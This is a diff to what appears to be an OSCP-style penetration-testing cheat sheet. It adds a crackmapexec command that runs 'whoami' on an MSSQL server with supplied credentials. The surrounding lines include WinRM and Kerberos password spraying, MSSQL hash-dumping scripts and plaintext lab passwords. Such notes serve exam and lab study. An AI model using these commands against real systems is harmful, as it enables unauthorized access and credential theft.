@@ -871,6 +871,10 @@ ldapsearch -x -H ldap://192.168.214.122 -b "DC=hutch,DC=offsec"
 ````
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP
 ````
+##### Crackmapexec
+````
+proxychains crackmapexec mssql -d oscp.exam -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148
+````
 ##### Logging in
 ````
 sqsh -S $IP -U sa -P CrimsonQuiltScalp193
@@ -3817,6 +3821,7 @@ sudo proxychains crackmapexec winrm 10.10.124.140 -u Administrator -p hghgib6vHT
 sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
 sudo crackmapexec winrm 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
 sudo crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
+proxychains crackmapexec mssql -d oscp.exam -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148
 ````
 ````
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
